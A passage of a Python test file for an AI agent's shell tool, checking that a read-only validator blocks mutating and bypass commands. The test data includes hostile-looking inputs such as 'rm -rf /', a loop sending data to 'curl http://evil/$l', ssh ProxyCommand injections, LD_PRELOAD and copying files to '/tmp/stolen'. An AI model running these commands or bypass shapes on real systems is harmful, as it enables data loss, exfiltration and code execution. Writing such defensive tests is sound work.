# Copyright 2025 Vijaykumar Singh <vijay@anvaiops.com>
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Tests for bash tool."""

import pytest
from unittest.mock import AsyncMock, MagicMock, patch

from victor.tools.bash import shell
from victor.tools.bash import _maybe_attribute_shell_git_commit


@pytest.mark.asyncio
async def test_shell_simple_command():
    """Test executing a simple bash command."""
    result = await shell(cmd="echo 'hello'")

    assert result["success"] is True
    assert "hello" in result["stdout"]
    assert result["return_code"] == 0


@pytest.mark.asyncio
async def test_shell_missing_command():
    """Test bash tool with missing command."""
    result = await shell(cmd="")

    assert result["success"] is False
    assert "Missing required parameter" in result["error"]


@pytest.mark.asyncio
async def test_shell_dangerous_command():
    """Test bash tool blocks dangerous commands."""
    result = await shell(cmd="rm -rf /", dangerous=False)

    assert result["success"] is False
    assert "Dangerous command blocked" in result["error"]


@pytest.mark.asyncio
async def test_shell_allow_dangerous():
    """Test bash tool allows dangerous commands when explicitly allowed."""
    # This won't actually execute, just test the allow flag works
    with patch("asyncio.create_subprocess_shell") as mock_subprocess:
        mock_process = MagicMock()
        mock_process.returncode = 0
        mock_process.communicate = AsyncMock(return_value=(b"", b""))
        mock_subprocess.return_value = mock_process

        await shell(cmd="rm -rf test", dangerous=True, readonly=False)

        # Should attempt to execute
        mock_subprocess.assert_called_once()


@pytest.mark.asyncio
async def test_shell_with_working_dir():
    """Test bash command with working directory."""
    result = await shell(cmd="pwd", cwd="/tmp")

    assert result["success"] is True
    # The working dir might be in stdout or as a field
    assert "/tmp" in result.get("stdout", "") or result.get("cwd") == "/tmp"


@pytest.mark.asyncio
async def test_shell_timeout():
    """Test bash command timeout.

    Mocked at run_managed_process (the shared spawn/kill/timeout runner,
    co-design review item 15) rather than asyncio.create_subprocess_shell:
    shell() no longer calls process.communicate() directly, so mocking that
    call would silently stop exercising shell()'s timeout-handling path.
    """
    with patch("victor.tools.subprocess_executor.run_managed_process") as mock_run:
        mock_run.return_value = (b"", b"", -1, True, False)  # timed_out=True

        result = await shell(cmd="sleep 100", timeout=1, readonly=False)

        assert result["success"] is False
        assert "timed out" in result["error"] or "Failed to execute" in result["error"]


@pytest.mark.asyncio
async def test_shell_working_dir_not_found():
    """Test bash command with non-existent working directory."""
    result = await shell(cmd="pwd", cwd="/nonexistent/directory")

    assert result["success"] is False
    assert "Working directory does not exist" in result["error"]
    assert result["return_code"] == -1


@pytest.mark.asyncio
async def test_shell_general_exception():
    """Test bash command general exception handling."""
    with (
        patch("asyncio.create_subprocess_shell") as mock_subprocess,
        patch("victor.tools.bash._is_readonly_command", return_value=False),
    ):
        mock_subprocess.side_effect = RuntimeError("Unexpected error")

        result = await shell(cmd="echo test", readonly=False)

        assert result["success"] is False
        assert "Failed to execute command" in result["error"]
        assert result["return_code"] == -1


@pytest.mark.asyncio
async def test_shell_defaults_to_non_readonly_mode():
    """Shell defaults to readonly=False; the allowlist is opt-in.

    Commit 989dd14e flipped the default (the LLM echoed readonly=True back
    from the schema, blocking legitimate commands). The dangerous-command
    check and ShellSafetyPolicy remain the always-on safety floor (covered
    by test_shell_dangerous_command); a benign non-allowlisted command must
    run when the caller omits the flag, and readonly=True must still opt
    into the allowlist.
    """
    result = await shell(cmd="sleep 1")

    assert result["success"] is True
    assert result["return_code"] == 0

    opted_in = await shell(cmd="sleep 1", readonly=True)

    assert opted_in["success"] is False
    assert "readonly mode" in opted_in["error"]


@pytest.mark.parametrize(
    "cmd",
    [
        "scp host:/remote ./local",
        "rsync --remove-source-files host:/remote ./local",
        "ssh -o ProxyCommand='touch /tmp/x' host cat /etc/hosts",
    ],
)
async def test_shell_transport_writes_require_non_readonly_execution(cmd):
    """The public gate rejects before spawning; explicit execution still works."""
    from victor.security.shell_safety_policy import LegacyAllowlistPolicy

    with (
        patch("victor.tools.bash._get_shell_safety_policy", return_value=LegacyAllowlistPolicy()),
        patch(
            "victor.tools.subprocess_executor.run_managed_process", new_callable=AsyncMock
        ) as run,
    ):
        blocked = await shell(cmd=cmd, readonly=True)
        assert blocked["success"] is False
        assert "readonly mode" in blocked["error"]
        run.assert_not_awaited()

        run.return_value = (b"", b"", 0, False, False)
        allowed = await shell(cmd=cmd, readonly=False)
        assert allowed["success"] is True
        run.assert_awaited_once()


@pytest.mark.asyncio
async def test_shell_readonly_allows_cd_search_with_stderr_suppression():
    """Readonly shell should allow common scoped search commands."""
    result = await shell(
        cmd=('cd rust && grep -rn "Arc\\|Mutex" crates/*/src/*.rs 2>/dev/null | head -20')
    )

    assert result["success"] is True
    assert result["return_code"] == 0


@pytest.mark.asyncio
async def test_shell_heredoc_command():
    """Heredoc commands should execute without extra escaping."""
    cmd = "cat <<'EOF'\nprint('hello')\nEOF"
    result = await shell(cmd=cmd)

    assert result["success"] is True
    assert "print('hello')" in result["stdout"]


@pytest.mark.asyncio
async def test_shell_broad_search_commands_are_not_redirected():
    """Broad searches use the canonical managed process owner on a cache miss."""
    cache = MagicMock()
    cache.get.return_value = None
    with (
        patch("victor.tools.shell_command_cache.get_shell_cache", return_value=cache),
        patch(
            "victor.tools.subprocess_executor.run_managed_process",
            new_callable=AsyncMock,
            return_value=(b"match\n", b"", 0, False, False),
        ) as run,
    ):
        result = await shell(cmd="rg FilePathField .", readonly=False)
    run.assert_awaited_once()
    assert run.call_args.kwargs["command"].startswith("rg ")
    assert result["success"] is True
    assert result["cached"] is False
    assert "match" in result["stdout"]
    cache.set.assert_not_called()


@pytest.mark.asyncio
async def test_shell_blocks_filesystem_wide_find():
    """`find / ...` is guarded (commit 92935ec9) — immediate error, no execution."""
    result = await shell(cmd="find / -name '*.py'")

    assert result["success"] is False
    assert "Filesystem-wide searches are not allowed" in result["error"]
    assert result["return_code"] == -1


class TestReadonlyControlFlow:
    """Read-only shell control-flow validation (glm-5.1 docs-audit regression).

    The agent repeatedly emitted read-only `for`/`if`/`while` loops that were
    rejected ("Command 'for' is not allowed in readonly mode") because the
    validator treated shell keywords as commands. Control-flow keywords are now
    structural: the loop *body* commands, command substitutions and assignment
    RHS are still validated, so read-only loops pass but mutations are rejected.
    """

    @staticmethod
    def _valid(cmd: str) -> bool:
        from victor.tools.bash import _validate_readonly_command

        return _validate_readonly_command(cmd)[0]

    @pytest.mark.parametrize(
        "cmd",
        [
            # The exact failing pattern from the transcript.
            'for d in docs/*/; do cnt=$(find "./$d" -name "*.md" | wc -l); echo "$d : $cnt"; done',
            "for i in 1 2 3; do echo $i; done",
            "if [ -f README.md ]; then cat README.md; fi",
            'while read line; do echo "$line"; done',
            "cnt=$(find . -name '*.py' | wc -l)",
            "for f in a b c; do test -f $f; done",
        ],
    )
    def test_readonly_control_flow_allowed(self, cmd):
        assert self._valid(cmd) is True

    @pytest.mark.parametrize(
        "cmd",
        [
            "for x in *; do rm $x; done",  # mutation in loop body
            "for x in $(rm -rf /tmp/x); do echo $x; done",  # mutation in header sub
            "if true; then mv a b; fi",  # mutation in if body
            "echo $(rm important.txt)",  # mutation in command substitution
            'echo "x" > file.txt',  # write redirect
            "while read l; do curl http://evil/$l; done",  # non-readonly in body
        ],
    )
    def test_readonly_control_flow_rejected(self, cmd):
        assert self._valid(cmd) is False

    def test_simple_commands_unaffected(self):
        assert self._valid("ls -la") is True
        assert self._valid("cd src && grep -n foo bar.py") is True
        assert self._valid("rm -rf /") is False
        assert self._valid("git status") is True
        assert self._valid("git push") is False


class TestReadonlyCompoundCommands:
    """Common observed readonly command chains and write escape regressions."""

    @staticmethod
    def _valid(cmd: str) -> bool:
        from victor.tools.bash import _validate_readonly_command

        return _validate_readonly_command(cmd)[0]

    @pytest.mark.parametrize(
        "cmd",
        [
            "cd victor && cat tools/bash.py",
            "cat victor/tools/bash.py && sed -n '1,40p' victor/tools/bash.py",
            "cat victor/tools/bash.py | sed -n '1,80p' | grep readonly",
            "sed -n '1,80p' victor/tools/bash.py && grep -n readonly victor/tools/bash.py",
            "grep -rn readonly victor/tools 2>/dev/null | head -20",
            "less < README.md",
            "git status >/dev/null 2>&1",
            "cat README.md | wc -l",
            "find victor -name '*.py' | sort | uniq | head -50",
        ],
    )
    def test_observed_readonly_chains_allowed(self, cmd):
        assert self._valid(cmd) is True

    @pytest.mark.parametrize(
        "cmd",
        [
            "pdfinfo attachments/report.pdf",
            "pdftotext attachments/report.pdf - | sed -n '1,20p'",
            "pdftocairo -f 1 -l 1 -singlefile -png attachments/scan.pdf - | "
            "tesseract stdin stdout",
            "tesseract attachments/image.jpg stdout",
            "ffprobe -v error -show_format -show_streams attachments/video.mp4",
            "ffmpeg -loglevel error -ss 00:00:05 -i attachments/video.mp4 "
            "-frames:v 1 -f image2pipe -vcodec png - | tesseract stdin stdout",
        ],
    )
    def test_readonly_media_inspection_allowed(self, cmd):
        assert self._valid(cmd) is True

    @pytest.mark.parametrize(
        "cmd",
        [
            "pdftotext attachments/report.pdf report.txt",
            "pdftocairo -png attachments/report.pdf page",
            "tesseract attachments/image.jpg extracted",
            "ffprobe -o metadata.json attachments/video.mp4",
            "ffmpeg -i attachments/video.mp4 output.mp4",
            "ffmpeg -i attachments/video.mp4 output.mp4 -f image2pipe -",
        ],
    )
    def test_readonly_media_file_outputs_rejected(self, cmd):
        assert self._valid(cmd) is False

    @pytest.mark.parametrize(
        "cmd",
        [
            "cat README.md > /tmp/readme.copy",
            "git status > status.txt",
            "grep -rn readonly victor 2> errors.txt",
            "cat README.md | tee /tmp/readme.copy",
            "cat README.md | sed -n '1p' | tee output.txt",
            "cat README.md && rm README.md",
            "cat README.md || rm README.md",
            "cat README.md | sh",
            "cat README.md | bash",
            "sed -i 's/a/b/' README.md",
            "sed -i.bak 's/a/b/' README.md",
            "grep foo README.md > matches.txt || cat README.md",
        ],
    )
    def test_write_or_exec_hidden_in_chains_rejected(self, cmd):
        assert self._valid(cmd) is False


class TestReadonlyQuoteAwareSubstitutions:
    r"""Quote-aware substitution scanning (regression: literal backticks/pipes).

    Markdown/mermaid audits run `grep '^```mermaid'` and `grep -c '```\|```'`.
    A prior naive scanner treated the single-quoted backticks as command
    substitutions and surfaced a spurious `|` command, wrongly rejecting these
    read-only greps. Single quotes are literal in shell, so they must pass; real
    (unquoted / double-quoted) substitutions must still be validated.
    """

    @staticmethod
    def _valid(cmd: str) -> bool:
        from victor.tools.bash import _validate_readonly_command

        return _validate_readonly_command(cmd)[0]

    @pytest.mark.parametrize(
        "cmd",
        [
            "grep -n '^```mermaid' docs/architecture/BLUEPRINT.md",
            "grep -c '```\\|```' docs/architecture/BLUEPRINT.md",
            "echo '$(rm -rf /)'",  # single-quoted -> literal -> safe
            "cat file `echo hi`",  # real backtick sub of a read-only command
        ],
    )
    def test_quoted_literals_and_safe_subs_allowed(self, cmd):
        assert self._valid(cmd) is True

    @pytest.mark.parametrize(
        "cmd",
        [
            "cat $(rm important.txt)",  # unquoted substitution mutation
            "cat file `rm important.txt`",  # backtick substitution mutation
            'echo "$(rm important.txt)"',  # double-quoted subs ARE active in shell
        ],
    )
    def test_real_substitution_mutations_rejected(self, cmd):
        assert self._valid(cmd) is False


class TestShellGitCommitAttribution:
    """Best-effort agent-layer attribution for raw ``git commit -m "..."``
    issued through the shell escape hatch (mirrors the ``git`` tool wiring)."""

    TRAILER = "Co-authored-by: victor-code-ai"

    @pytest.mark.parametrize(
        "cmd",
        [
            'git commit -m "fix: x"',
            "git commit -m 'fix: x'",
            "git commit --message 'fix: x'",
            'git commit --message="fix: x"',
            'git commit -m="fix: x"',
        ],
    )
    def test_plain_commit_gets_trailer(self, cmd, monkeypatch):
        monkeypatch.delenv("VICTOR_COMMIT_ATTRIBUTION", raising=False)
        out = _maybe_attribute_shell_git_commit(cmd)
        assert self.TRAILER in out
        # Command shape preserved.
        assert out.startswith("git commit")

    @pytest.mark.parametrize(
        "cmd",
        [
            'git add . && git commit -m "x"',  # chaining
            'git commit -m "x" | tee log',  # pipe
            'git commit -m "$(date)"',  # command substitution
            "git commit -F - <<EOF",  # heredoc
            'git commit --amend -m "x"',  # amend
            "echo hi",  # not a git commit
            "git commit -F msg.txt",  # message-file form
            'git -c core.x=1 commit -m "hi"',  # -c config form
            "git status",  # not a commit
        ],
    )
    def test_compound_or_dynamic_commands_left_untouched(self, cmd, monkeypatch):
        monkeypatch.delenv("VICTOR_COMMIT_ATTRIBUTION", raising=False)
        assert _maybe_attribute_shell_git_commit(cmd) == cmd

    def test_opt_out_leaves_message_untouched(self, monkeypatch):
        monkeypatch.setenv("VICTOR_COMMIT_ATTRIBUTION", "0")
        cmd = 'git commit -m "fix: x"'
        assert _maybe_attribute_shell_git_commit(cmd) == cmd

    def test_idempotent_on_reapplication(self, monkeypatch):
        # Running the rewriter twice must not duplicate the trailer.
        monkeypatch.delenv("VICTOR_COMMIT_ATTRIBUTION", raising=False)
        once = _maybe_attribute_shell_git_commit('git commit -m "fix: x"')
        twice = _maybe_attribute_shell_git_commit(once)
        assert once.count(self.TRAILER) == 1
        assert twice == once


class TestReadonlyRemoteExec:
    """Remote-exec commands (ssh, scp, rsync) — readonly analysis of payload.

    ssh: extract the remote command and validate it recursively.
    scp/rsync: either direction writes files and requires non-readonly mode.
    """

    @staticmethod
    def _valid(cmd: str) -> bool:
        from victor.tools.bash import _validate_readonly_command

        return _validate_readonly_command(cmd)[0]

    # --- SSH: readonly remote commands ---

    @pytest.mark.parametrize(
        "cmd",
        [
            "ssh vsingh@aiserver1 'ps aux | grep sandhi'",
            "ssh host 'cat /etc/hostname'",
            "ssh host 'ls -la /tmp/'",
            "ssh host 'grep -rn error /var/log/syslog'",
            "ssh host 'ps aux | grep inferflux | grep -v grep'",
            "ssh -p 22 host 'uptime'",
            "ssh -o StrictHostKeyChecking=no host 'df -h'",
            "ssh host 'free -h && df -h /'",
            "ssh host 'cat /etc/sandhi/streaming-v0.14.0.json'",
            "ssh host 'tail -50 ~/.victor/logs/victor.log'",
            "ssh host 'wc -l /var/log/syslog'",
            # user@host forms
            "ssh user@host 'ps aux'",
            "ssh vsingh@aiserver1 'cat /etc/hostname'",
            # multiple -o flags + user@host + quoted command
            "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@host 'ps aux | grep sandhi'",
            "ssh -o BatchMode=yes -o ConnectTimeout=5 user@host 'uptime'",
            # boolean flags mixed with value flags
            "ssh -t -o BatchMode=yes host 'df -h'",
            "ssh -tt host 'ls -la /tmp/'",
            "ssh -v -o BatchMode=yes user@host 'cat /etc/hostname'",
        ],
    )
    def test_ssh_readonly_remote_commands_allowed(self, cmd):
        assert self._valid(cmd) is True

    # --- SSH: mutating remote commands ---

    @pytest.mark.parametrize(
        "cmd",
        [
            "ssh host 'rm -rf /tmp/foo'",
            "ssh host 'echo hello > /tmp/file'",
            "ssh host 'systemctl restart nginx'",
            "ssh host 'apt-get install foo'",
            "ssh host 'kill -9 1234'",
        ],
    )
    def test_ssh_mutating_remote_commands_rejected(self, cmd):
        assert self._valid(cmd) is False

    # --- SSH: no command (interactive session) ---

    def test_ssh_interactive_session_rejected(self):
        assert self._valid("ssh host") is False
        assert self._valid("ssh vsingh@aiserver1") is False

    # --- SCP: direction-based ---

    @pytest.mark.parametrize(
        "cmd",
        [
            "scp host:/remote/file.txt ./local/",
            "scp vsingh@aiserver1:/tmp/diag.sh ./",
            "scp -P 22 host:/remote/file.txt ./local/",
            "scp -r host:/remote/dir ./local/",
        ],
    )
    def test_scp_pull_writes_local_files(self, cmd):
        assert self._valid(cmd) is False

    @pytest.mark.parametrize(
        "cmd",
        [
            "scp ./file.txt host:/remote/path",
            "scp ./diag.sh vsingh@aiserver1:/tmp/",
            "scp -r ./dir host:/remote/path",
        ],
    )
    def test_scp_push_not_readonly(self, cmd):
        assert self._valid(cmd) is False

    # --- rsync: direction-based ---

    @pytest.mark.parametrize(
        "cmd",
        [
            "rsync host:/src/ ./dst/",
            "rsync vsingh@aiserver1:/tmp/data ./local/",
        ],
    )
    def test_rsync_pull_writes_local_files(self, cmd):
        assert self._valid(cmd) is False

    @pytest.mark.parametrize(
        "cmd",
        [
            "rsync ./src/ host:/dst/",
            "rsync ./data vsingh@aiserver1:/tmp/",
        ],
    )
    def test_rsync_push_not_readonly(self, cmd):
        assert self._valid(cmd) is False

    # --- Compound: ssh in chains ---

    def test_ssh_readonly_in_chain_allowed(self):
        assert self._valid("ssh host 'ps aux' && cat output.txt") is True

    def test_ssh_mutating_in_chain_rejected(self):
        assert self._valid("ssh host 'rm -rf /' && cat output.txt") is False


class TestReadonlyRemoteExecHardening:
    """Adversarial regressions for the remote-exec readonly analysis.

    Each test pins a bypass shape found by hostile review: forwarding flags,
    mis-parsed combined short flags, and the env exec wrapper.
    """

    @staticmethod
    def _valid(cmd):
        from victor.tools.bash import _validate_readonly_command

        ok, _ = _validate_readonly_command(cmd)
        return ok

    # --- ssh port forwarding: never readonly regardless of payload ---

    @pytest.mark.parametrize(
        "cmd",
        [
            "ssh -L 8080:inhost:80 host cat /etc/hosts",
            "ssh -R 9999:localhost:22 host cat /etc/hosts",
            "ssh -D 1080 host cat /etc/hosts",
            "ssh -W target:22 jump cat /etc/hosts",
            "ssh -L8080:inhost:80 host cat /etc/hosts",  # attached value
            "ssh -vL 8080:inhost:80 host cat /etc/hosts",  # clustered flag
            "ssh -w 1:1 host cat /etc/hosts",  # tun device allocation
        ],
    )
    def test_ssh_forwarding_rejected(self, cmd):
        assert self._valid(cmd) is False

    # --- combined short flags: value flag inside a cluster consumes the
    # next token (ssh -vp 22 host ... == ssh -v -p 22 host ...) ---

    def test_ssh_combined_flag_benign_payload_allowed(self):
        assert self._valid("ssh -vp 22 host cat /etc/hosts") is True

    @pytest.mark.parametrize(
        "cmd",
        [
            # Pre-fix: '-vp' treated as one boolean token made '22' the host,
            # so the payload was validated starting one token late and the
            # mutating tail rode in as arguments of an allowlisted word.
            "ssh -vp 22 host rm -rf /tmp/x",
            "ssh -vp 22 cat rm -rf /tmp/x",  # host named like an allowlisted cmd
        ],
    )
    def test_ssh_combined_flag_mutating_payload_rejected(self, cmd):
        assert self._valid(cmd) is False

    def test_ssh_controlmaster_creates_local_socket(self):
        assert self._valid("ssh -M host cat /etc/hosts") is False
        assert self._valid("ssh -M host rm -rf /tmp/x") is False

    @pytest.mark.parametrize(
        "cmd",
        [
            'ssh -o ProxyCommand="touch /tmp/x" host cat /etc/hosts',
            'ssh -o ProxyCommand="rm /tmp/x" host cat /etc/hosts',
            'ssh -o PermitLocalCommand=yes -o LocalCommand="touch /tmp/x" host cat /etc/hosts',
            'ssh -oLocalCommand="touch /tmp/x" host cat /etc/hosts',
            "ssh -o LocalForward=8080:localhost:80 host cat /etc/hosts",
            "ssh -o remoteforward=8080:localhost:80 host cat /etc/hosts",
            "ssh -o Include=/tmp/untrusted.conf host cat /etc/hosts",
            "ssh -o UserKnownHostsFile=/tmp/output host cat /etc/hosts",
            "ssh -o 'UserKnownHostsFile /tmp/output' host cat /etc/hosts",
            "ssh -o UserKnownHostsFile=/dev/null,/tmp/output host cat /etc/hosts",
            "ssh -o RemoteCommand=touch host cat /etc/hosts",
            "ssh -F /tmp/untrusted.conf host cat /etc/hosts",
            "ssh -E /tmp/log host cat /etc/hosts",
            "ssh -S /tmp/socket host cat /etc/hosts",
            "ssh -I /tmp/untrusted.so host cat /etc/hosts",
            "ssh -O exit host cat /etc/hosts",
            "ssh -Z host cat /etc/hosts",
            "ssh -p",
            "X='unterminated ssh host cat",
            "ssh -o BatchMode=yes",
            "ssh -p22 host 'rm /tmp/x'",
            "scp host:/remote ./local > /tmp/log",
            "scp -S /tmp/untrusted host:/remote ./local",
            "rsync --remove-source-files host:/remote ./local",
            "rsync --delete host:/remote ./local",
            'rsync -e "touch /tmp/x" host:/remote ./local',
            'env -S "touch /tmp/x"',
            "env --split-string='touch /tmp/x'",
            "env --split-string='sh -c' 'touch /tmp/x'",
            "find . -exec env --split-string='touch /tmp/x' \\;",
            "env ssh -o ProxyCommand='touch /tmp/x' host cat /etc/hosts",
            "if true; then ssh -o ProxyCommand='touch /tmp/x' host cat /etc/hosts; fi",
            "find . -exec ssh host 'cat /etc/hosts; touch /tmp/x' \\;",
        ],
    )
    def test_readonly_transport_and_wrapper_bypasses_rejected(self, cmd):
        assert self._valid(cmd) is False

    @pytest.mark.parametrize(
        "cmd",
        [
            "ssh -i /tmp/ReadWriteIdentity host cat /etc/hosts",
            "ssh -o HostName=ReadWriteHost host cat /etc/hosts",
            "ssh -o 'StrictHostKeyChecking no' host cat /etc/hosts",
            "ssh -vvp22 host cat /etc/hosts",
            "ssh -vi/tmp/ReadWriteIdentity host cat /etc/hosts",
            "ssh -- host cat /etc/hosts",
            "env -u NAME ssh -p22 host cat /etc/hosts",
            "env --unset=NAME cat /etc/hosts",
            "env echo 'text; touch /tmp/x'",
            "find . -exec echo 'text; touch /tmp/x' \\;",
            "if true; then ssh -o 'StrictHostKeyChecking no' host cat /etc/hosts; fi",
        ],
    )
    def test_readonly_transport_argument_boundaries_preserved(self, cmd):
        assert self._valid(cmd) is True

    def test_ssh_attached_option_value_still_parses(self):
        assert self._valid("ssh -oStrictHostKeyChecking=no host cat /etc/hosts") is True
        assert self._valid("ssh -p22 host cat /etc/hosts") is True

    # --- env is a generic exec wrapper: validate what it wraps ---

    @pytest.mark.parametrize(
        "cmd",
        [
            "env rm -rf /tmp/x",
            "env VAR=1 rm -f x",
            "env -u X rm -f x",
            "env touch /tmp/x",
            "env git push",
            "env ssh host rm -rf /tmp/x",  # wrapper around mutating remote exec
            "ssh host env rm -rf /tmp/x",  # env inside a remote payload
        ],
    )
    def test_env_wrapped_mutation_rejected(self, cmd):
        assert self._valid(cmd) is False

    @pytest.mark.parametrize(
        "cmd",
        [
            "env",
            "env VAR=1 cat /etc/hosts",
            "env cat file.txt",
            "env ssh host cat /etc/hosts",
            "printenv",
        ],
    )
    def test_env_wrapped_readonly_allowed(self, cmd):
        assert self._valid(cmd) is True


class TestReadonlyFindActions:
    """find's action flags: -exec family validated recursively, delete/write
    actions rejected, plain readonly finds untouched.

    Regression (pre-existing hole): `find . -exec rm {} ;`, `find -delete` and
    the -fprint family all executed under readonly mode because the allowlist
    only checked the base command.
    """

    @staticmethod
    def _valid(cmd):
        from victor.tools.bash import _validate_readonly_command

        return _validate_readonly_command(cmd)[0]

    @pytest.mark.parametrize(
        "cmd",
        [
            "find . -name x -exec rm {} ;",
            "find /tmp -delete",
            "find . -name '*.log' -exec rm {} +",
            "find . -execdir sh -c 'x' ;",
            "find . -name x -ok rm {} ;",
            "find . -exec cp {} /tmp/stolen ;",
            # unterminated form: the compound splitter consumes `;` first
            "find . -name x -exec rm {}",
            # mutating clause after a benign one
            "find . -name x -exec cat {} ; -delete",
        ],
    )
    def test_find_exec_and_delete_rejected(self, cmd):
        assert self._valid(cmd) is False

    @pytest.mark.parametrize(
        "cmd",
        [
            "find . -fprint /tmp/out",
            "find . -fprintf /tmp/out '%p'",
            "find . -fprint0 /tmp/out",
            "find . -fls /tmp/out",
        ],
    )
    def test_find_file_writing_actions_rejected(self, cmd):
        assert self._valid(cmd) is False

    @pytest.mark.parametrize(
        "cmd",
        [
            "find . -name '*.py'",
            "find . -type f -name x -print",
            "find . -maxdepth 2 -ls",
            # readonly -exec: the wrapped command validates cleanly ({} stays
            # an opaque argument)
            "find . -name x -exec cat {} ;",
            "find . -name x -exec grep foo {} +",
            # a test VALUE that looks like an action flag is not one
            "find . -name -delete",
            "find . -newer ref.txt -print",
            "find . \\( -name a -o -name b \\) -ls",
        ],
    )
    def test_readonly_find_forms_still_allowed(self, cmd):
        assert self._valid(cmd) is True


class TestReadonlySemanticBoundaries:
    @pytest.mark.parametrize(
        "cmd",
        [
            "echo data>out.txt",
            "cat<in.txt>out.txt",
            "cat <>out.txt",
            "echo data 2>>out.txt",
            "cat <(touch out.txt)",
            "echo first\ntouch out.txt",
            "echo first & touch out.txt",
            "cat <(cat in.txt; touch out.txt)",
            "cat >(touch out.txt)",
            "source commands.sh",
            ". commands.sh",
            "env source commands.sh",
            "awk 'BEGIN {system(\"touch out.txt\")}'",
            "sed -n 'w out.txt' in.txt",
            "sed 's/a/b/e' in.txt",
            "sed 's/a/b/w out.txt' in.txt",
            "sed -f commands.sed in.txt",
            "sort -o out.txt in.txt",
            "sort --output=out.txt in.txt",
            "rg --pre=commands.sh pattern in.txt",
            "rg --hostname-bin commands.sh pattern in.txt",
            "git branch deleted -D",
            "git branch newly-created",
            "git tag new-tag",
            "git remote add new https://example.invalid/r",
            "git stash",
            "git stash clear",
            "git worktree prune",
            "git config user.name changed",
            "git reflog expire --all",
            "git show --output=out.txt",
            "git diff --ext-diff",
            "git grep -Ocommands.sh pattern",
            "git -c core.pager=commands.sh log",
            "ssh host 'cat in.txt>out.txt'",
            "ssh host 'cat <(touch out.txt)'",
            "ssh host 'source commands.sh'",
        ],
    )
    def test_write_or_opaque_execution_is_not_classified_readonly(self, cmd):
        from victor.tools.bash import _validate_readonly_command

        assert _validate_readonly_command(cmd)[0] is False

    @pytest.mark.parametrize(
        "cmd",
        [
            "echo 'a>b'",
            "echo a\\>b",
            "cat <in.txt",
            "echo data>/dev/null",
            "cat <(cat in.txt)",
            "sort -n in.txt",
            "rg -n pattern in.txt",
            "sed -n '1,80p' in.txt",
            "sed -n -e '1p' in.txt",
            "sed 's/a/b/g' in.txt",
            "git -C repo status",
            "git branch --list 'feature/*'",
            "git branch -a",
            "git tag --list 'v*'",
            "git remote -v",
            "git remote get-url origin",
            "git stash list",
            "git worktree list --porcelain",
            "git config --get user.name",
            "git config --list",
            "git reflog show",
            "git diff --no-ext-diff",
        ],
    )
    def test_supported_readonly_forms_keep_their_argument_semantics(self, cmd):
        from victor.tools.bash import _validate_readonly_command

        assert _validate_readonly_command(cmd)[0] is True


@pytest.mark.parametrize(
    "cmd",
    [
        "echo data>out.txt",
        "cat <(touch out.txt)",
        "source commands.sh",
        "A=1>out.txt",
        r"echo `echo \`touch out.txt\``",
        "$(printf touch) out.txt",
        "python3 arbitrary.py",
        "node arbitrary.js",
        "gh pr merge 1",
        "docker buildx build .",
        "find . $(printf -- -delete)",
        'sort "$OP" file',
        'ssh host "cat $PAYLOAD"',
        "RUSTC=./helper cargo metadata --locked",
        "GIT_SSH_COMMAND=./helper git ls-remote git@host:repo",
        "printf '%n' PATH; cat plain.txt",
        "printf -vPATH '%s' 0; cat plain.txt",
        "read -aPATH",
        "printf -v 'arr[$(echo fixture)]' x",
        'printf "$FORMAT" value',
        'ACTION=-delete; find . -name -- "$ACTION"',
        'FLAGS=--output=out; git diff --src-prefix -- "$FLAGS"',
        'FLAGS=--pre=helper; rg "$FLAGS" pattern file',
        "pip list --log output.log",
        "gh pr view 1 --web=true",
        "ffmpeg -i in.mp4 -vf metadata=mode=print:file=output -f image2pipe -",
        "ffprobe -report input.mp4",
        "tesseract input.png stdout -c debug_file=output",
    ],
)
async def test_readonly_semantic_rejections_do_not_spawn_but_explicit_writes_can(cmd):
    with (
        patch("victor.tools.shell_command_cache.get_shell_cache") as cached,
        patch(
            "victor.tools.subprocess_executor.run_managed_process",
            new_callable=AsyncMock,
            return_value=(b"ok", b"", 0, False, False),
        ) as execute,
    ):
        blocked = await shell(cmd=cmd, readonly=True)
        assert blocked["success"] is False
        cached.assert_not_called()
        execute.assert_not_awaited()
        permitted = await shell(cmd=cmd, readonly=False)
        assert permitted["success"] is True
        cached.assert_not_called()
        execute.assert_awaited_once()


@pytest.mark.parametrize(
    "command",
    [
        "A=1>out.txt",
        "A=1>>out.txt",
        "A=1>out.txt echo safe",
        r"echo `echo \`touch out.txt\``",
        "$(printf touch) out.txt",
        "env $(printf touch) out.txt",
        'python3 -c \'open("out.txt", "w").write("x")\'',
        'node -e \'require("fs").writeFileSync("out.txt", "x")\'',
        "pytest -q",
        "pytest --help",
        "tox",
        "npm test",
        "make test",
        "cargo test",
        "go test ./...",
        "gh pr merge 1",
        "gh repo delete repo",
        "gh api --method DELETE repos/a/b",
        "docker buildx build .",
        "docker manifest push image",
        "helm repo add a https://example.invalid",
        "kubectl config use-context context",
        "ruff check --fix file.py",
        "eslint --fix file.js",
        "git grep --open=commands.sh pattern",
        "sort --out=out.txt in.txt",
        "sort --compress-program=commands.sh in.txt",
    ],
)
def test_remaining_opaque_execution_and_assignment_writes_are_not_reads(command):
    from victor.tools.bash import _validate_readonly_command

    assert _validate_readonly_command(command)[0] is False


@pytest.mark.parametrize(
    "command",
    [
        "python3 --version",
        "node --help",
        "npm view pkg",
        "cargo tree --locked",
        "go version",
        "gh pr view 1",
        "gh repo view",
        "gh api repos/a/b --method GET",
        "docker buildx inspect",
        "docker manifest inspect image",
        "helm repo list",
        "kubectl config view",
        "ruff check file.py",
        "eslint --version",
        "git diff --no-ext-diff",
        "cat <(cat in.txt)",
        r"echo `echo \`printf safe\``",
    ],
)
def test_nonexecuting_inspection_forms_still_work(command):
    from victor.tools.bash import _validate_readonly_command

    assert _validate_readonly_command(command)[0] is True


@pytest.mark.parametrize(
    "command",
    [
        "PATH=/untrusted ls",
        "env LD_PRELOAD=/tmp/lib.so cat file",
        "RIPGREP_CONFIG_PATH=commands.conf rg pattern",
        "tar -xf archive.tar",
        "tar --delete -f archive.tar",
        "tar -tf archive.tar --checkpoint-action=exec=commands.sh",
        "unzip archive.zip",
        "kubectl cluster-info dump --output-directory=out",
        "gh pr view --web 1",
    ],
)
def test_executable_environment_and_archive_mutations_require_permission(command):
